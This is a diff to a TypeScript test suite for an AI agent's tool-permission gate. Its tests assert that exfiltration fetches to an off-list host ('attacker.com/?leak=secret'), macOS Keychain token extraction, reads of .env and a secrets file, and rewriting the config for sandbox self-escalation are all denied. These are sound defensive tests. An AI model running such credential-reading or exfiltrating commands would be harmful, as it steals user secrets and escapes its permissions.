@@ -16,6 +16,11 @@ function configWith(overrides: Partial<MarsclawConfig>): MarsclawConfig {
     voice_enabled: false,
     agent_provider: 'claude',
     extra_bash_denylist: [],
+    // Permissive baseline so the denylist/path tests below exercise their
+    // logic; the locked-by-default behaviour is asserted in dedicated tests.
+    allow_shell: true,
+    allow_web: true,
+    allowed_web_domains: ['example.com'],
     ...overrides,
   };
 }
@@ -100,6 +105,55 @@ describe('canUseTool', () => {
     const fn = buildCanUseTool(configWith({}));
     expect((await call(fn, 'WebFetch', { url: 'https://example.com' })).behavior).toBe('allow');
     expect((await call(fn, 'Task', { prompt: 'x' })).behavior).toBe('allow');
+  });
+
+  it('allows WebFetch only for URLs whose host is on the allow-list', async () => {
+    const fn = buildCanUseTool(configWith({ allowed_web_domains: ['wikipedia.org'] }));
+    expect((await call(fn, 'WebFetch', { url: 'https://en.wikipedia.org/wiki/X' })).behavior).toBe('allow');
+    expect((await call(fn, 'WebFetch', { url: 'https://attacker.com/?leak=secret' })).behavior).toBe('deny');
+  });
+
+  it('denies WebFetch with empty allow-list even when web is on', async () => {
+    const fn = buildCanUseTool(configWith({ allowed_web_domains: [] }));
+    expect((await call(fn, 'WebFetch', { url: 'https://wikipedia.org/' })).behavior).toBe('deny');
+  });
+
+  it('removes the shell entirely when allow_shell is false', async () => {
+    const fn = buildCanUseTool(configWith({ allow_shell: false }));
+    expect((await call(fn, 'Bash', { command: 'ls -la' })).behavior).toBe('deny');
+    expect((await call(fn, 'Bash', { command: 'echo hi' })).behavior).toBe('deny');
+  });
+
+  it('removes web egress when allow_web is false', async () => {
+    const fn = buildCanUseTool(configWith({ allow_web: false }));
+    expect((await call(fn, 'WebFetch', { url: 'https://example.com' })).behavior).toBe('deny');
+    expect((await call(fn, 'WebSearch', { query: 'x' })).behavior).toBe('deny');
+  });
+
+  it('denies reading .env even when its directory is allowed', async () => {
+    const fn = buildCanUseTool(configWith({ allowed_paths: [process.cwd()] }));
+    const r = await call(fn, 'Read', { file_path: join(process.cwd(), '.env') });
+    expect(r.behavior).toBe('deny');
+  });
+
+  it('denies rewriting data/config.json (sandbox self-escalation)', async () => {
+    const fn = buildCanUseTool(configWith({ allowed_paths: [process.cwd()] }));
+    const r = await call(fn, 'Write', { file_path: join(process.cwd(), 'data', 'config.json') });
+    expect(r.behavior).toBe('deny');
+  });
+
+  it('denies Keychain credential extraction via Bash', async () => {
+    const fn = buildCanUseTool(configWith({}));
+    const r = await call(fn, 'Bash', {
+      command: 'security find-generic-password -s marsclaw -a google-refresh-token:default -w',
+    });
+    expect(r.behavior).toBe('deny');
+  });
+
+  it('denies Bash reads of the data/secrets store', async () => {
+    const fn = buildCanUseTool(configWith({}));
+    const r = await call(fn, 'Bash', { command: 'cat data/secrets/google-refresh-token.txt' });
+    expect(r.behavior).toBe('deny');
   });
 
   it('always allows mcp__ tools (no path / command checks)', async () => {
